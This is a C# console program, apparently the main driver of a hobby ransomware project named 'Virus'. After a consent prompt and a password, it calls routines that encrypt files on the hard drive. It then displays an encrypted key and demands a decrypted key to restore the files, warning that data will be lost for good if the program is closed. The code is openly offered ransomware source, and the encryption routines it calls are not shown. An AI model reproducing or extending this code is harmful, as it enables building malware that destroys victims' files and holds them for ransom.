using DataTypeStoreLib;
using System.Numerics;
using Virus;





Console.WriteLine("This program will encrypt cirtain files on your harddrive without there being any guarantee for them to be decrypted. \nSOME DATA MIGHT GET LOST FOREVER!\nIf you don't exactly know what you're doing, then I recomment you to just exit this program and no harm will happen.");
Console.WriteLine("Type \"Encrypt\" to encrypt your files");
if (Console.ReadLine() != "Encrypt")
{
    return;
}


Console.WriteLine("Gotcha,");
Console.WriteLine("Please enter the password to continue!");
if (Console.ReadLine() != "DoItPlease")
{
    Console.WriteLine("Wrong password.");
    Console.ReadKey();
    return;

}
try
{
    BigInteger encryptedKey;
    if (args.Length == 1 && args[0].ToLower() == Virus.Virus.defaultKey.ToLower())
    {
        Console.WriteLine("Trying to restore encrypted key...");
        encryptedKey = (BigInteger)Automatic.ConvertRegion(Read.TopLevelRegion(File.ReadAllText(Virus.Virus.defaultKey).Split(';'))[0]);
        Console.WriteLine("Encrypted key restored!\nPress any key to continue.");
        Console.ReadKey();

    }
    else
    {

        if (args.Length == 1)
        {
            if (args[0].ToLower() == Virus.Virus.defaultDecryptedKey.ToLower())
            {
                Console.Clear();
                byte[] decryptedKey = (byte[])Automatic.ConvertRegion(Read.TopLevelRegion(File.ReadAllText(Virus.Virus.defaultDecryptedKey).Split(';'))[0]);
                Console.WriteLine("This key is not checked. If it is wrong, all of your files might be lost!");
                Console.WriteLine("Press any key to continue decryption");
                Console.ReadKey(true);
                List<EncryptedFiles> decryptFiles = (List<EncryptedFiles>)Automatic.ConvertRegion(Read.TopLevelRegion(File.ReadAllText(Virus.Virus.defaultFiles).Split(';'))[0]);
                Virus.Virus.DecryptAll(decryptFiles, decryptedKey);
                return;
            }
            Console.Clear();
            Console.WriteLine("That file doesn't equal to the default recovery path or default decrypted key path.");
            Console.ReadKey();
            return;
        }
        encryptedKey = Virus.Virus.EncryptAll();

    }

    while (true)
    {
        Console.Clear();
        Console.WriteLine("CONGRATULATIONS\nI have successfully encrypted your files, because you wanted to.\nNow, DONT CLOSE THIS PROGRAM, OR ALL OF YOUR FILES WILL BE GONE FOR GOOD");
        Console.WriteLine("There are multible ways to recover your files:\n1. (Recommended) Write download the key decryptor and the Keypair file from the latest github release, and provide it the key, that I'll be giving you in a second\n2. Bruteforce the password and decrypt your files yourself (It would take a computer about 7 octodecillion(10^57) years to crack your password - https://www.security.org/how-secure-is-my-password/)");
        Console.WriteLine("Press any key to show the key");
        Console.ReadKey();
        Console.WriteLine("\n" + encryptedKey.ToString("x") + "\n");
        Console.WriteLine("Now please, enter his decrypted key here:");
        byte[] decryptedKey = BigInteger.Parse(Console.ReadLine(), System.Globalization.NumberStyles.HexNumber).ToByteArray();
        checkKey:
        Console.WriteLine("I'll just check the key for a second...");
        if (decryptedKey.Length != 32)
        {
            Console.WriteLine("Nope, the key is invalid (invalid byte lengh)");
            Console.ReadKey();
            continue;
        }
        try
        {
            Console.WriteLine("Importing checksum...");
            byte[] checksum = (byte[])Automatic.ConvertRegion(Read.TopLevelRegion(File.ReadAllText(Virus.Virus.defaultChecksum).Split(';'))[0]);
            Console.WriteLine("Decrypting checksum...");
            byte[] originalChecksum = new byte[] { 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, };
            if (!Enumerable.SequenceEqual(Crypting.Decrypt(checksum, decryptedKey), originalChecksum))
            {
                Console.WriteLine("\n");
                Crypting.Decrypt(checksum, decryptedKey).ToList().ForEach(x => Console.WriteLine(x));
                Console.WriteLine("Nope, the key is invalid (invalid checksum)");
                Console.ReadKey();
                continue;
            }
            Console.Clear();
            Console.WriteLine("Nice, the key is valid!\nWouldn't it be funny if you couldn't decrypt anything anyways?\nWell, press any key to continue and decrypt every encrypted file and please\nDO NOT TUCH THIS PROGRAM WHILST IT IS DECRYPTING OR ALL FILES WILL BE LOST!!!!!");
            Console.ReadKey();
            List<EncryptedFiles> decryptFiles = (List<EncryptedFiles>)Automatic.ConvertRegion(Read.TopLevelRegion(File.ReadAllText(Virus.Virus.defaultFiles).Split(';'))[0]);
            Virus.Virus.DecryptAll(decryptFiles, decryptedKey);
            return;
        }
        catch
        {

        }
    }
}
catch (Exception ex)
{
    Console.WriteLine($"{ex.Message}");
    Console.WriteLine(ex.StackTrace);
    Console.ReadKey();
    return;
}